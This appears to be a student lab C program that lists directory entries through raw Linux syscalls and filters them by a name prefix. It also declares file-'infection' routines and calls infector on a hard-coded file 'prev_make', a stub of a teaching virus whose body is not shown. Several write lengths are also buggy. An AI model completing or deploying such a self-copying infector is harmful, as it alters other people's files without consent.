#include "util.h"

#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 0x8d

struct linux_dirent {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_reclen;  /* Length of this linux_dirent */
               char           d_name[];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
               /*
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
               */
           };

typedef struct linux_dirent dirnet;

int system_call();
void code_start();
void code_end();
void infection(int num);
void infector(char* file_name);


int main(int argc, char **argv)
{
    void* start_ptr = &code_start;
    void* end_ptr = &code_end;

    int debug_mode = 0;
    int output_fd = STDOUT;
    int input_fd = STDIN;
    char * infect_prefix = "";

    int nread, fd, bpos;
    struct linux_dirent *d;

    int BUF_SIZE = 8192;
    int arg_index = 1;
    char buf[BUF_SIZE];

    char * ten_spaces = "            ";
    char* new_line = "\n";
    char *prefix = "";

    while (arg_index < argc) {
        if (!strcmp(argv[arg_index], "-D"))
            debug_mode = 1;
        arg_index++;
    }
    arg_index = 1;

    while (arg_index < argc)
	{
        if (!strncmp(argv[arg_index], "-p", 2))
        {
			prefix = argv[arg_index] + 2;
		}
        else if (!strncmp(argv[arg_index], "-a", 2))
		{
            infect_prefix = argv[arg_index] + 2;
		}
        arg_index++;
	}

	system_call(SYS_WRITE, output_fd, new_line, strlen(new_line));
    fd = system_call(SYS_OPEN, ".", 0 , 0);
    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread == -1)
    {
        system_call(SYS_WRITE,STDOUT, "error-getdents",BUF_SIZE);
        return 1;
    }
    infector("prev_make");
    system_call(SYS_WRITE,output_fd, "file type    offset    d_name\n",31);
    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *) (buf + bpos);
        if (strncmp(prefix, d->d_name, strlen(prefix)))
        {
            bpos += d->d_reclen;
            continue;
        }
        system_call(SYS_WRITE, output_fd, itoa(d->d_reclen), 1);
        system_call(SYS_WRITE, output_fd, ten_spaces, strlen(ten_spaces));
        system_call(SYS_WRITE, output_fd, itoa(d->d_off), 1);
        system_call(SYS_WRITE, output_fd, ten_spaces, strlen(ten_spaces));
        system_call(SYS_WRITE, output_fd, d->d_name, strlen(d->d_name));
        system_call(SYS_WRITE, output_fd, new_line, strlen(new_line));
        bpos += d->d_reclen;
    }
    return 0;
}
